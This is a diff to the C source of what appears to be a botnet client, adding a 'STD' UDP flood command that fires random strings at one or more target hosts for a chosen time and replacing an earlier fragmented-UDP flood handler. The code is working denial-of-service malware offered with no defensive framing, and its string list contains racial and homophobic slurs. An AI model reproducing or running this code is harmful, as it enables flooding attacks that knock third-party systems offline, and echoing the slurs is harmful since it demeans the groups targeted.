@@ -13,7 +13,7 @@
 #define GRE_PROTO_IP 0x0800
 #define PROTO_UDPLITE 136
 
-
+#define STD_PIGZ 50
  
 #define UDP_HDRLEN 8
 #define IP_MAXPACKET 65535
@@ -709,7 +709,35 @@ void makeSystemUID(unsigned char *uid, int size) {
 
 
 
-
+void sendSTD(unsigned char *ip, int port, int secs) {
+int iSTD_Sock;
+iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
+time_t start = time(NULL);
+struct sockaddr_in sin;
+struct hostent *hp;
+hp = gethostbyname(ip);
+bzero((char*) &sin,sizeof(sin));
+bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+sin.sin_family = hp->h_addrtype;
+sin.sin_port = port;
+unsigned int a = 0;
+while(1){
+char *randstrings[] = {"arfgG", "HBiug655", "KJYDFyljf754", "LIKUGilkut769458905", "JHFDSkgfc5747694", "GJjyur67458", "RYSDk747586", "HKJGi5r8675", "KHGK7985i", "yuituiILYF", "GKJDghfcjkgd4", "uygtfgtrevf", "tyeuhygbtfvg", "ewqdcftr", "trbazetghhnbrty", "tbhrwsehbg", "twehgbferhb", "etrbhhgetrb", "edfverthbyrtb", "kmiujmnhnhfgn", "zcdbvgdfsbgfd", "gdfbtsdgb", "ghdugffytsdyt", "tgerthgwtrwry", "yteytietyue", "qsortEQS", "8969876hjkghblk", "std", "dts", "hackz", "shdyed", "http", "sghwiondc", "nigger", "pussy", "faggot"};
+char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
+if (a >= 50)
+{
+send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
+connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
+if (time(NULL) >= start + secs)
+{
+close(iSTD_Sock);
+_exit(0);
+}
+a = 0;
+}
+a++;
+}
+}
 
 
 void processCmd(int argc, unsigned char *argv[])
@@ -727,34 +755,33 @@ void processCmd(int argc, unsigned char *argv[])
                 return;
         }
 
-        if (!strcmp(argv[0], "FRAG"))
+        if(!strcmp(argv[0], "STD"))
 {
-    if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 4096) {
-        //sockprintf(mainCommSock, "Usage: UDPFRAG <target> <port> <time> <packet size>");
-        return;
-    }
-
-    unsigned char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int packetsize = atoi(argv[4]);
-
-    if (strstr((char *)ip, ",") != NULL) {
-        unsigned char *hi = strtok((char *)ip, ",");
-        while (hi != NULL) {
-            if (!listFork()) {
-                sendUDP_Fragmented(hi, port, time, packetsize);
-                _exit(0);
-            }
-            hi = strtok(NULL, ",");
-        }
-    } else {
-        if (listFork()) return;
-        sendUDP_Fragmented(ip, port, time, packetsize);
-        _exit(0);
-    }
+if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+{
+return;
 }
-     
+unsigned char *ip = argv[1];
+int port = atoi(argv[2]);
+int time = atoi(argv[3]);
+if(strstr(ip, ",") != NULL)
+{
+unsigned char *hi = strtok(ip, ",");
+while(hi != NULL)
+{
+if(!listFork())
+{
+sendSTD(hi, port, time);
+_exit(0);
+}
+hi = strtok(NULL, ",");
+}
+} else {
+if (listFork()) { return; }
+sendSTD(ip, port, time);
+_exit(0);
+}
+}
 	if(!strcmp(argv[0], "KILLATTK"))
         {
                 int killed = 0;
